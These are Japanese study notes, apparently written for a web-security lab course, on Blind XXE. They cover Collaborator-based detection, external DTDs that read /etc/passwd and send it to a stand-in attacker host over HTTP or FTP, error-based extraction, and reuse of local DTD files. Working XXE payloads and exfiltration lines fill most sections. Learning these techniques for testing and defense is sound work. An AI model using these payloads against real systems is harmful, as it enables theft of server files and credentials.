# OASTテクニックが使用できる場合のBlind XXE w/Collaborator


## OASTによるBlind XXEでのデータの抽出

#### ①OASTによるBlind XXEの検出

1. Collaboratorでドメインを生成し、[2. XXE攻撃によるファイル取得とSSRF攻撃](2.%20XXE攻撃によるファイル取得とSSRF攻撃.md#XXEによるSSRF攻撃実行方法)と同じようにする
```dtd
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://COLLABORATOR_DOMAIN"> ]>
<stockCheck>
  <productId>&xxe;</productId>
</stockCheck>
```

2. CollaboratorでHTTPリクエストとDNS look-upを監視し、反応があれば検出したことになる

##### 💡Tips: XMLパラメータエンティティの使用によるXXEブロックバイパス

- Blind XXEや通常のエンティティ参照が使用できないOASTなどで使用する
- ==DTD内でのみ参照できる==。定義と展開に`%`を使用する
```dtd
<!DOCTYPE hoge [<!ENTITY % xxe SYSTEM "http://COLLABORATOR_DOMAIN"> %xxe; ]>
```

#### ②OASTによるBlind XXEの悪用でデータを抽出する

1. DTDを作成する(malicious.dtd)
```dtd
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8

<!ENTITY % file SYSTEM "file:///etc/passwd"> 
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://COLLABORATOR_DOMAIN/?x=%file;'>"> 
%eval; 
%exfiltrate;
```
- XMLパーサの動きは [XMLの基本](XMLの基本.md#XMLパーサの処理順)を参照

2. 攻撃者がDTDを自身のシステムにホストする
```
http://abc.web-attacker.com/malicious.dtd
```

3. 攻撃者が脆弱なアプリケーションに対してXXEペイロードを送信する
```dtd
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://abc.web-attacker.com/malicious.dtd"> %xxe;]>
```
- これにより、XMLパーサは攻撃者のサーバから外部DTDを取得し、行内で解釈する
- 前に攻撃者が定義した`%eval;`と`%exfiltrate;`が順に解釈・実行され、`/etc/passwd`の内容が攻撃者のサーバに送信される。

###### アドバイス:

- `/etc/passwd`のように改行文字を含むものは取得できないケースがある
- 👉 HTTPの代わりにFTPプロトコルを使用する。
	- `<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'ftp://web-attacker.com/?x=%file;'>"> `
	- `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "ftp://web-attacker.com/malicious.dtd"> %xxe;]>`
- 👉 改行文字を含まない他の機密情報(`/etc/hostname`など）を取得してみる

# OASTがブロックされている場合のBlind XXE

## error-based Blind XXEでのデータの抽出

- アプリケーションがレスポンスでエラーメッセージを返す場合に有効

1. 意図的にエラーを発生させる外部DTDを作成する
```dtd
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8

<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///thisisnotexist/%file;'>"> 
%eval; 
%error;
```
- 存在しない`file:///[デタラメ]/etc/passwd`をロードしようとすると、存在しないファイルの名前（`/etc/passwd`の内容）を含むエラーメッセージが表示される

2. DTDを読み込むXXE injectionする
```dtd
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://EXPLOIT_DOMAIN/malicious.dtd"> %xxe;]>
```

- 結果例
```
java.io.FileNotFoundException: /thisisnotexist/root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin ...
```

## Expert: ローカルDTDの再利用によるBlind XXEの悪用

1. ローカルDTDの列挙

- [DTD-fineder list](https://github.com/GoSecure/dtd-finder/blob/master/list/dtd_files.txt)
- 上記のリストを使用してIntruderなどで列挙する。
	- URLエンコードのチェックボックスは外すこと
![[Pasted image 20231209180228.png | 300]]

- エラーを返さなければそのDTDファイルは存在する。
```dtd
<!DOCTYPE foo [ 
<!ENTITY % local_dtd SYSTEM "file://§§"> 
%local_dtd; 
]>
```

2. 存在するファイルで再定義できるエンティティを見つける

- インターネット検索でファイルのコピーを入手する。GoSecureなどのサイト
- 再定義できるエンティティは`<!ENTITY % ~>`
- 再定義できない場合の反応：エラーメッセージor 無視 or 異なる方法で処理

3. 外部エンティティ再定義によるerror-based XXE
```dtd
<!DOCTYPE foo [ 
<!ENTITY % local_dtd SYSTEM "file://[local_DTD_filepath]"> 
<!ENTITY % [再定義する外部エンティティ] ' 
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> 
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///thisisnotexist/&#x25;file;&#x27;>"> 
&#x25;eval; 
&#x25;error; 
'> 
%local_dtd; 
]>
```
- [XMLの基本](XMLの基本.md#XMLエンティティ対応表)

###### 原理

- Blind XXEの悪用にはout-of-band接続がよく使用されるため、FWでブロックされていることが多い
- 外部DTDで定義した内容を内部DTDで再定義している場合、[3. Blind XXE](3.%20Blind%20XXE.md#エラーメッセージによるBlind%20XXEでのデータの抽出)のテクニックが使用できる
	- しかし、out-of-band接続がブロックされているので外部DTDをリモートの場所からロードすることはできない。
	- 代わりに、アプリケーションサーバのローカルに存在する外部DTDファイルを使用する

- XMLパーサの仕様で、パラメータエンティティは外部DTDでのみ使用可能。
	- しかし、[XMLの基本](XMLの基本.md#外部DTDで定義したエンティティを内部DTDで再定義する)テクニックを使用することで、パラメータエンティティの使用制限が緩和される
